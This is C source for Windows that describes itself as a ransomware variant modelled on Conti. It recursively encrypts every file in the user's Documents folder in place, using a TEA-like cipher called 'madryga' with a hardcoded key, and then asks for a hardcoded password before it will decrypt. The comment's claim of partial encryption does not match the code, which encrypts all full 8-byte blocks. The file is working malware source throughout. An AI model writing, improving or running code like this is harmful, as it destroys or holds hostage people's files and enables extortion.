/* 
The problem with madryga.c is that it would take way too long to encrypt everything in
a folder. So instead, this version, will only partially encrypt every file. 
Similar to Conti ransomware. */

#include <stdio.h>
#include <stdint.h>
#include <string.h>
#include <windows.h>
#include <shlobj.h>

#define ROUNDS 32

typedef uint32_t u32;

u32 key[4] = {0x23423423, 0x45645645, 0x67867867, 0x89A89A89};

void madryga_encrypt(u32 *v, u32 *k) {
    u32 v0=v[0], v1=v[1], sum=0, i;
    u32 delta=0x9e3779b9;
    for ( i = 0; i < ROUNDS; i++) {
        sum += delta;
        v0 += ((v1 << 4) + k[0]) ^ (v1 + sum) ^ ((v1 >> 5) + k[1]);
        v1 += ((v0 << 4) + k[2]) ^ (v0 + sum) ^ ((v0 >> 5) + k[3]);
    }
    v[0]=v0; v[1]=v1;
}

void madryga_decrypt(u32 *v, u32 *k) {
    u32 v0=v[0], v1=v[1], sum=0xC6EF3720, i;
    u32 delta=0x9e3779b9;
    for ( i = 0; i < ROUNDS; i++) {
        v1 -= ((v0 << 4) + k[2]) ^ (v0 + sum) ^ ((v0 >> 5) + k[3]);
        v0 -= ((v1 << 4) + k[0]) ^ (v1 + sum) ^ ((v1 >> 5) + k[1]);
        sum -= delta;
    }
    v[0]=v0; v[1]=v1;
}
// take pointer to data and it's length
void madryga_encrypt_data(unsigned char *data, int data_len) {
    uint32_t *ptr = (uint32_t *)data;
    // Only process complete 8-byte blocks
    for (int i = 0; i < data_len / 8; i++) {
        madryga_encrypt(ptr + (i * 2), key);
    }
}

void madryga_decrypt_data(unsigned char *data, int data_len) {
    uint32_t *ptr = (uint32_t *)data;
    // Only process complete 8-byte blocks
    for (int i = 0; i < data_len / 8; i++) {
        madryga_decrypt(ptr + (i * 2), key);
    }
}

// file encryption and decryption logic
void encryptFile(const char* input_path, const char* output_path) {
    FILE* input_file = fopen(input_path, "rb");
    FILE* output_file = fopen(output_path, "wb");

    if (!input_file || !output_file) {
        perror("Error opening file");
        if (input_file) fclose(input_file);
        if (output_file) fclose(output_file);
        return;
    }
    
    fseek(input_file, 0, SEEK_END);
    long file_size = ftell(input_file);
    fseek(input_file, 0, SEEK_SET);

    // Only allocate if file size is valid
    if (file_size <= 0) {
        fclose(input_file);
        fclose(output_file);
        return;
    }

    unsigned char* file_contents = (unsigned char*)malloc(file_size);
    if (!file_contents) {
        fclose(input_file);
        fclose(output_file);
        return;
    }

    size_t bytes_read = fread(file_contents, 1, file_size, input_file);
    if (bytes_read > 0) {
        madryga_encrypt_data(file_contents, bytes_read);
        fwrite(file_contents, 1, bytes_read, output_file);
    }

    free(file_contents);
    fclose(input_file);
    fclose(output_file);
}

void decryptFile(const char* input_path, const char* output_path) {
    FILE* input_file = fopen(input_path, "rb");
    FILE* output_file = fopen(output_path, "wb");

    if (!input_file || !output_file) {
        perror("Error opening file");
        if (input_file) fclose(input_file);
        if (output_file) fclose(output_file);
        return;
    }

    fseek(input_file, 0, SEEK_END);
    long file_size = ftell(input_file);
    fseek(input_file, 0, SEEK_SET);

    // Only allocate if file size is valid
    if (file_size <= 0) {
        fclose(input_file);
        fclose(output_file);
        return;
    }

    unsigned char* file_contents = (unsigned char*)malloc(file_size);
    if (!file_contents) {
        fclose(input_file);
        fclose(output_file);
        return;
    }

    size_t bytes_read = fread(file_contents, 1, file_size, input_file);
    if (bytes_read > 0) {
        madryga_decrypt_data(file_contents, bytes_read);
        fwrite(file_contents, 1, bytes_read, output_file);
    }

    free(file_contents);
    fclose(input_file);
    fclose(output_file);
}

// Encrypt folder Logic
void handleFiles(const char* folderPath) {
    WIN32_FIND_DATAA findFileData;
    char searchPath[MAX_PATH];
    sprintf(searchPath, "%s\\*", folderPath);

    HANDLE hFind = FindFirstFileA(searchPath, &findFileData);

    if (hFind == INVALID_HANDLE_VALUE) {
        printf("Error: Could not find folder %s\n. Code: %d", folderPath, GetLastError());
        return;
    }

    do {
        const char* fileName = findFileData.cFileName;
        if (strcmp(fileName, ".") == 0 || strcmp(fileName, "..") == 0) {
            continue;
        }

        char filePath[MAX_PATH];
        sprintf(filePath, "%s\\%s", folderPath, fileName);

        if (findFileData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {
            handleFiles(filePath); // recursive call for subfolders
        } else {
            // Process individual files in-place
            FILE* file = fopen(filePath, "rb+");
            if (file) {
                printf("Encrypting file: %s\n", filePath);
                
                fseek(file, 0, SEEK_END);
                long file_size = ftell(file);
                fseek(file, 0, SEEK_SET);

                if (file_size > 0) {
                    unsigned char* buffer = (unsigned char*)malloc(file_size);
                    if (buffer) {
                        size_t bytes_read = fread(buffer, 1, file_size, file);
                        if (bytes_read > 0) {
                            madryga_encrypt_data(buffer, bytes_read);
                            fseek(file, 0, SEEK_SET);
                            fwrite(buffer, 1, bytes_read, file);
                        }
                        free(buffer);
                    }
                }
                fclose(file);
            }
        } 
    } while (FindNextFileA(hFind, &findFileData) != 0);

    FindClose(hFind);
}
// Decrypt folder Logic
void decryptFiles(const char* folderPath) {
    WIN32_FIND_DATAA findFileData;
    char searchPath[MAX_PATH];
    sprintf_s(searchPath, MAX_PATH, "%s\\*", folderPath);

    HANDLE hFind = FindFirstFileA(searchPath, &findFileData);

    if (hFind == INVALID_HANDLE_VALUE) {
        printf("error: %d\n", GetLastError());
        return;
    }

    do {
        const char* fileName = findFileData.cFileName;
        if (strcmp(fileName, ".") == 0 || strcmp(fileName, "..") == 0) {
            continue;
        }

        char filePath[MAX_PATH];
        sprintf_s(filePath, MAX_PATH, "%s\\%s", folderPath, fileName);

        if (findFileData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {
            decryptFiles(filePath);
        } else {
            // Process individual files in-place
            FILE* file = fopen(filePath, "rb+");
            if (file) {
                printf("Decrypting file: %s\n", filePath);
                
                fseek(file, 0, SEEK_END);
                long file_size = ftell(file);
                fseek(file, 0, SEEK_SET);

                if (file_size > 0) {
                    unsigned char* buffer = (unsigned char*)malloc(file_size);
                    if (buffer) {
                        size_t bytes_read = fread(buffer, 1, file_size, file);
                        if (bytes_read > 0) {
                            madryga_decrypt_data(buffer, bytes_read);
                            fseek(file, 0, SEEK_SET);
                            fwrite(buffer, 1, bytes_read, file);
                        }
                        free(buffer);
                    }
                }
                fclose(file);
            }
        }
    } while (FindNextFileA(hFind, &findFileData) != 0);

    FindClose(hFind);
}

// Add this function near the top with other functions
int verifyPassword() {
    char password[50];
    printf("Files have been encrypted!\n");
    printf("Enter password to decrypt: ");
    scanf("%s", password);
    
    // Hardcoded password comparison
    return strcmp(password, "daniel") == 0;
}

// Replace the main function
int main() {
    char documentsPath[MAX_PATH];
    HRESULT result = SHGetFolderPathA(NULL, CSIDL_PERSONAL, NULL, SHGFP_TYPE_CURRENT, documentsPath);
    
    if (SUCCEEDED(result)) {
        printf("Documents folder: %s\n", documentsPath);
        // First encrypt everything
        handleFiles(documentsPath);
        
        // Only decrypt if correct password is provided
        if (verifyPassword()) {
            printf("Password correct! Decrypting files...\n");
            decryptFiles(documentsPath);
            printf("Decryption complete!\n");
        } else {
            printf("Incorrect password! Files will remain encrypted.\n");
        }
    } else {
        printf("Error getting Documents folder path. Error code: %ld\n", result);
        return 1;
    }
    
    return 0;
}